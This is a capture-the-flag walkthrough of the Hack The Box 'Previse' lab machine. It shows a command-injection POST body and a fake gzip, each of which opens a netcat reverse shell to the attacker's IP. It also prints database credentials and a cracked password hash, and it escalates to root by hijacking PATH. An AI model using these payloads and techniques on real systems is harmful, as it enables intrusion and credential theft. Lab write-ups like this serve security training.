# Previse

URL: https://app.hackthebox.com/machines/Previse

Level: Easy

Date 20 Oct 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Tue Oct 19 15:32:58 2021 as: nmap -T4 -p- -oN 01_nmap 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.082s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Oct 19 15:33:17 2021 -- 1 IP address (1 host up) scanned in 18.24 seconds
```

(Webpage is vulnerable to "Execution After Redirect" - ref. https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR) )

We made a request such:

http://10.10.11.104/download.php?file=gesu

And we found our string in:

```
root@balance:/home/sugo/htb/Previse# curl -b cazzo -X POST  http://10.10.11.104/logs.php -d "delim=comma"
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1634653027,sughenji,32
1634653367,sughenji,33
1634654351,sughenji,33
1634654514,sughenji,iout.log
1634654518,sughenji,out.log
1634659413,sughenji,out.log
1634659435,sughenji,rev.php
1634659592,sughenji,/var/log/access.log
1634659601,sughenji,/var/www/file_access.log
1634659608,sughenji,file_access.log
1634660429,sughenji,gesu
```

We start a `netcat` listener:

```
root@balance:/home/sugo/htb/Previse/sitebackup# nc -nlvp 1234
listening on [any] 1234 ...
```

And we made a POST request in order to start `nc` toward our attacker machine:

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=ovdsrg2v2uu0fclerb6lbnq0f9
Upgrade-Insecure-Requests: 1

comma%26nc+-e+/bin/sh+10.10.16.5+1234
```

We get a shell, and we upgrade it:

```
root@balance:/home/sugo/htb/Previse/sitebackup# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.104] 49516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
accounts.php
android-chrome-192x192.png
android-chrome-512x512.png
apple-touch-icon.png
config.php
css
download.php
favicon-16x16.png
favicon-32x32.png
favicon.ico
file_logs.php
files.php
footer.php
header.php
index.php
js
login.php
logout.php
logs.php
nav.php
site.webmanifest
status.php
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$
```

We search for MySQL password:

```
www-data@previse:/var/www/html$ cat config.php
cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
www-data@previse:/var/www/html$ mysql -uroot -p
mysql -uroot -p
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | sughenji | $1$🧂llol$6udvbwHmfvmoKc2GDa2Pd/ | 2021-10-20 15:38:02 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

We cannot retrive user flag, so we need some lateral movement:

```
www-data@previse:/var/www/html$ cd /home
cd /home
www-data@previse:/home$ ls
ls
m4lwhere
www-data@previse:/home$ cd m4lwhere
cd m4lwhere
www-data@previse:/home/m4lwhere$ ls
ls
user.txt
www-data@previse:/home/m4lwhere$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@previse:/home/m4lwhere$
```

Then, we try to crack `m4lwhere` hash:

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

# User-flag

We can now access through SSH and grab user flag:

```
root@balance:/home/sugo/htb/Previse# ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 20 16:04:21 UTC 2021

  System load:  0.24              Processes:           173
  Usage of /:   49.4% of 4.85GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$
root@kaligra:~/FROM_INVERSION/htb/Previse# cat 15_user_flag
4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ cat /home/m4lwhere/user.txt
3574e5fdff7adf2af80f89cbb3a1a99d
m4lwhere@previse:/tmp$
```

# Privesc

We try some basic privesc technique, such `sudo`:

```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

We create a "fake" gzip:

```
m4lwhere@previse:/tmp$ echo "nc -e /bin/bash 10.10.16.5 5555" > gzip
m4lwhere@previse:/tmp$ chmod +x gzip
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
```

We start our listener:

```
root@balance:/home/sugo/htb/Previse# nc -nvlp 5555
listening on [any] 5555 ...
```

and we receive shell:

```
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh


root@balance:/home/sugo/htb/Previse# nc -nvlp 5555
listening on [any] 5555 ...

connect to [10.10.16.5] from (UNKNOWN) [10.10.11.104] 57186

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
522511b7fa05c4170ac2a1274d010f48
```



